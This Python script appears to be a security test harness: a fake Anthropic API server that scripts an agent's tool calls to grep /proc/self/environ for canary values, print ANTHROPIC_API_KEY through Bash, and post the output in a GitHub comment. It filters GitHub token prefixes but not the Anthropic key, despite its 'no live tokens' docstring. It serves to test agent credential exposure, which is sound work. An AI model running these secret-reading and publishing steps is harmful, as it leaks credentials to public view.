#!/usr/bin/env python3
"""Hosted control: Grep /proc/self identity + environ canary, then Bash scrub.

Comment body is filtered: comm/status text plus CANARY-* lines only.
Live ghp_/ghs_/github_pat_ values are dropped.
"""
from __future__ import annotations

import json
import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("FAKE_ANTHROPIC_PORT", "8899"))
HOLD_SECONDS = int(os.environ.get("FAKE_ANTHROPIC_HOLD", "90"))
BAD = ("ghp_", "ghs_", "gho_", "ghu_", "github_pat_")


def sse(event: str, data: dict) -> str:
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"


def stream(blocks: list, stop: str) -> bytes:
    out = [
        sse(
            "message_start",
            {
                "type": "message_start",
                "message": {
                    "id": "m",
                    "type": "message",
                    "role": "assistant",
                    "model": "claude-opus-4-1-20250805",
                    "content": [],
                    "stop_reason": None,
                    "stop_sequence": None,
                    "usage": {"input_tokens": 1, "output_tokens": 1},
                },
            },
        )
    ]
    for i, b in enumerate(blocks):
        if b.get("type") == "tool_use":
            out.append(
                sse(
                    "content_block_start",
                    {
                        "type": "content_block_start",
                        "index": i,
                        "content_block": {
                            "type": "tool_use",
                            "id": f"t{i}",
                            "name": b["name"],
                            "input": {},
                        },
                    },
                )
            )
            out.append(
                sse(
                    "content_block_delta",
                    {
                        "type": "content_block_delta",
                        "index": i,
                        "delta": {
                            "type": "input_json_delta",
                            "partial_json": json.dumps(b["input"]),
                        },
                    },
                )
            )
        else:
            out.append(
                sse(
                    "content_block_start",
                    {
                        "type": "content_block_start",
                        "index": i,
                        "content_block": {"type": "text", "text": ""},
                    },
                )
            )
            out.append(
                sse(
                    "content_block_delta",
                    {
                        "type": "content_block_delta",
                        "index": i,
                        "delta": {"type": "text_delta", "text": b.get("text", "")},
                    },
                )
            )
        out.append(sse("content_block_stop", {"type": "content_block_stop", "index": i}))
    out.append(
        sse(
            "message_delta",
            {
                "type": "message_delta",
                "delta": {"stop_reason": stop, "stop_sequence": None},
                "usage": {"output_tokens": 1},
            },
        )
    )
    out.append(sse("message_stop", {"type": "message_stop"}))
    return "".join(out).encode()


def scrub(blob: str) -> str:
    blob = blob.replace("\x00", "\n")
    keep = []
    for line in blob.splitlines():
        if any(b in line for b in BAD):
            continue
        keep.append(line)
    return "\n".join(keep)


def canary_lines(blob: str) -> str:
    lines = []
    for line in scrub(blob).splitlines():
        if "CANARY-" in line:
            lines.append(line)
    return "\n".join(lines) if lines else "NO_CANARY_MATCH"


def tool_results(req: dict) -> list:
    out = []
    for m in req.get("messages") or []:
        c = m.get("content")
        if isinstance(c, list):
            for b in c:
                if isinstance(b, dict) and b.get("type") == "tool_result":
                    cc = b.get("content")
                    out.append(cc if isinstance(cc, str) else json.dumps(cc))
    return out


STEPS = [
    {
        "name": "Grep",
        "input": {
            "pattern": ".",
            "path": "/proc/self/comm",
            "output_mode": "content",
        },
    },
    {
        "name": "Grep",
        "input": {
            "pattern": "^Name:",
            "path": "/proc/self/status",
            "output_mode": "content",
        },
    },
    {
        "name": "Grep",
        "input": {
            "pattern": "CANARY",
            "path": "/proc/self/environ",
            "output_mode": "content",
        },
    },
    {
        "name": "Bash",
        "input": {
            "command": 'printf KEY=%s\\n "${ANTHROPIC_API_KEY:-EMPTY}"'
        },
    },
]


class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def do_POST(self):
        n = int(self.headers.get("content-length", 0) or 0)
        raw = self.rfile.read(n) if n else b""
        try:
            req = json.loads(raw)
        except Exception:
            req = {}
        if not self.path.split("?")[0].endswith("/messages"):
            body = b'{"input_tokens":1}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        results = tool_results(req)
        step = len(results)
        if step < len(STEPS):
            blocks = [{"type": "tool_use", **STEPS[step]}]
            stop = "tool_use"
        elif step == len(STEPS):
            comm = scrub(results[0])[:200]
            status = scrub(results[1])[:200]
            env = canary_lines(results[2])
            bash = scrub(results[3])[:200]
            body = (
                "hosted-control (canary-only; no live tokens):\n\n"
                f"Grep /proc/self/comm:\n```\n{comm}\n```\n\n"
                f"Grep /proc/self/status Name:\n```\n{status}\n```\n\n"
                f"Grep /proc/self/environ CANARY:\n```\n{env}\n```\n\n"
                f"Bash printf KEY=$ANTHROPIC_API_KEY:\n```\n{bash}\n```\n"
            )
            blocks = [
                {
                    "type": "tool_use",
                    "name": "mcp__github_comment__update_claude_comment",
                    "input": {"body": body[:8000]},
                }
            ]
            stop = "tool_use"
        else:
            time.sleep(HOLD_SECONDS)
            blocks = [{"type": "text", "text": "done"}]
            stop = "end_turn"
        data = stream(blocks, stop)
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


if __name__ == "__main__":
    ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
